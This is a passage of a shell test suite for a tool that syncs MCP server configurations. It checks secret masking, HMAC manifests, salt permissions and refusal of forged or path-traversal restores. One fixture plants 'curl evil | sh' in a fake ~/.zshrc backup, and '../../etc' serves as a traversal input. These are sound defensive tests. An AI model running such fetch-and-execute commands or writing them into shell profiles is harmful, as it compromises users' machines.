hasnt 'TARGET-WRITTEN' "$o" 'F6: target never written (pre-write validation)'
eq "$V0" "$(sum "$HOME/.htv/config.toml")" 'F6: TOML unchanged'

# F7a: resolver CRLF stripped
mk hres json mcpServers mcpservers-json "~/.hres/mcp.json" true null null high
RESCR="$T/resolver-crlf.sh"; printf '#!/bin/sh\nprintf "%%s\\r\\n" "$FIXSECRET"\n' > "$RESCR"; chmod +x "$RESCR"
run apply --ssot "$SSOT3" --harness hres --resolver "$RESCR"
eq ok "$(python3 -c 'import json,os,sys; v=json.load(open(sys.argv[1]))["mcpServers"]["v"]["headers"]["A"]; print("ok" if v==os.environ["FIXSECRET"] else "bad")' "$HOME/.hres/mcp.json")" 'F7: resolver \r\n stripped'
# F7b: 1-3 char secrets masked in output
export SHORTS="Q7z"
echo '{"schema":1,"servers":{"s":{"transport":"stdio","command":"tool","args":["--k=${SHORTS}"],"env":{"E":"${SHORTS}"}}}}' > "$T/ssot-short.json"
run plan --ssot "$T/ssot-short.json" --harness hjson --json
hasnt 'Q7z' "$o" 'F7: short (3-char) secret masked in JSON output'
run plan --ssot "$T/ssot-short.json" --harness hjson
hasnt 'Q7z' "$o" 'F7: short secret masked in text output'
# F7c: manifest = per-install salted HMAC; salt file 0600
eq 600 "$(mode "$SD/salt")" 'F7: salt file mode 600'
HM="$(python3 - "$SD/manifest.json" "$HOME/.hmod/mcp.json" <<'PY'
import hashlib,json,os,sys
m=json.load(open(sys.argv[1])); p=os.path.realpath(sys.argv[2]); cur=json.load(open(p))["mcpServers"]
srv=m["files"][p]["servers"]; n=sorted(srv)[0]
plain=hashlib.sha256(json.dumps(cur[n],sort_keys=True,separators=(",",":"),ensure_ascii=False).encode()).hexdigest()
print("plain" if srv[n]==plain else "hmac")
PY
)"
eq hmac "$HM" 'F7: manifest stores HMAC, not a plain hash'
# F7d: restore validates ts + target paths
run restore '../../etc'; eq 2 "$rc" 'F7: restore rejects path-traversal ts'
run restore '2026x'; eq 2 "$rc" 'F7: restore rejects malformed ts'
EVIL="20990101T000000000000Z"; mkdir -p "$SD/backups/$EVIL/hjson"
printf 'owned' > "$SD/backups/$EVIL/hjson/victim.txt"
printf '{"path": "%s", "existed": true}' "$T/victim.txt" > "$SD/backups/$EVIL/hjson/meta.json"
run restore "$EVIL"
eq 1 "$rc" 'F7: restore to a path not recorded for the harness is refused'
[ -e "$T/victim.txt" ] && no 'F7: forged restore target not created' exists || ok 'F7: forged restore target not created'
# F7e: empty key_path rejected at load
REGE="$T/reg-empty"; mkdir -p "$REGE"; sed 's/key_path: \[mcpServers\]/key_path: []/' "$REG/hjson.yaml" > "$REGE/hjson.yaml"
o="$("$BIN" explain --registry "$REGE" --state-dir "$SD" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
eq 2 "$rc" 'F7: empty key_path rejected at registry load'
has 'key_path must be non-empty' "$o" 'F7: key_path error explains'

# ---------------------------------------------------------------- lead round-2: N1 / N2 / F2(a)
# N1: restore writes ONLY to a registered config_path of the harness — a forged backup + forged manifest
#     entry pointing at ~/.zshrc must be refused and ~/.zshrc left untouched
printf '# my zshrc\n' > "$HOME/.zshrc"; Z0="$(sum "$HOME/.zshrc")"
ZTS="20990202T000000000000Z"; mkdir -p "$SD/backups/$ZTS/hjson"
ZR="$(python3 -c 'import os,sys; print(os.path.realpath(sys.argv[1]))' "$HOME/.zshrc")"
printf 'curl evil | sh\n' > "$SD/backups/$ZTS/hjson/.zshrc"
printf '{"path": "%s", "existed": true, "mode": "0o644"}' "$ZR" > "$SD/backups/$ZTS/hjson/meta.json"
python3 - "$SD/manifest.json" "$ZR" <<'PY'
import json,sys; p=sys.argv[1]; m=json.load(open(p)); m["files"][sys.argv[2]]={"harness":"hjson","servers":{}}; json.dump(m,open(p,"w"))
PY
run restore "$ZTS"
eq 1 "$rc" 'N1: forged manifest+backup targeting ~/.zshrc: restore exits 1'
eq "$Z0" "$(sum "$HOME/.zshrc")" 'N1: ~/.zshrc untouched'
has 'not recorded for this harness' "$o" 'N1: refusal reason'
python3 - "$SD/manifest.json" "$ZR" <<'PY'
import json,sys; p=sys.argv[1]; m=json.load(open(p)); m["files"].pop(sys.argv[2],None); json.dump(m,open(p,"w"))
PY
chmod 600 "$SD/manifest.json"
# N2: owned loose salt perms -> tightened + warning; symlinked salt -> refused
chmod 644 "$SD/salt"
run plan --ssot "$SSOT" --harness hjson
eq 0 "$rc" 'N2: loose (owned) salt: run continues'
has 'tightened to 0o600' "$o" 'N2: warning emitted on stderr'
eq 600 "$(mode "$SD/salt")" 'N2: salt tightened to 600'
chmod 755 "$SD"; run plan --ssot "$SSOT" --harness hjson
eq 700 "$(mode "$SD")" 'N2: loose state dir tightened to 700'
mv "$SD/salt" "$SD/salt.real"; ln -s "$SD/salt.real" "$SD/salt"
run plan --ssot "$SSOT" --harness hjson
eq 2 "$rc" 'N2: symlinked salt refused'
has 'not owned by the current user or a symlink' "$o" 'N2: refusal reason'
rm "$SD/salt"; mv "$SD/salt.real" "$SD/salt"
# F2(a): literal secret-looking arg/header -> refused for git-visible targets, masked warning otherwise
LITS='Zx9!kQ2mP7vR4tLw'
printf '{"schema":1,"servers":{"lit-pos":{"transport":"stdio","command":"tool","args":["run","%s"]}}}\n' "$LITS" > "$T/ssot-lint.json"
run apply --ssot "$T/ssot-lint.json" --harness hgtrk
hasnt 'lit-pos' "$(cat "$HOME/gitrepo/tracked.json")" 'F2a: literal positional secret refused for tracked target'
has 'looks like a literal secret' "$o" 'F2a: lint warning emitted'
hasnt "$LITS" "$o" 'F2a: lint warning never prints the value'
run apply --ssot "$T/ssot-lint.json" --harness hjson --json
has 'lit-pos' "$(cat "$HOME/.hjson/mcp.json")" 'F2a: non-git target applied (warn-only)'
hasnt "$LITS" "$o" 'F2a: literal secret masked in apply JSON preview'

# ---------------------------------------------------------------- global invariants
if grep -q "$FIXSECRET" "$ALLOUT"; then no 'fixture secret never printed (all modes)' "$(grep -c "$FIXSECRET" "$ALLOUT") hits"; else ok 'fixture secret never printed (all modes)'; fi
OUTSIDE="$(python3 - "$T" "$ALLOUT" <<'PY'
import re,sys
import os
root=os.path.realpath(sys.argv[1]); txt=open(sys.argv[2]).read()
print(" ".join(sorted({f for f in re.findall(r'"file": "([^"]+)"', txt) if not f.startswith(root)})))
PY
)"
eq "" "$OUTSIDE" 'every file the tool reported touching is inside the temp root'
CHG=""
while read -r f s; do [ "$(sum "$f")" = "$s" ] || CHG="$CHG $f"; done < "$REAL_SNAP"
eq "" "$CHG" 'no real (non-temp) config file changed'

printf '\n%d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
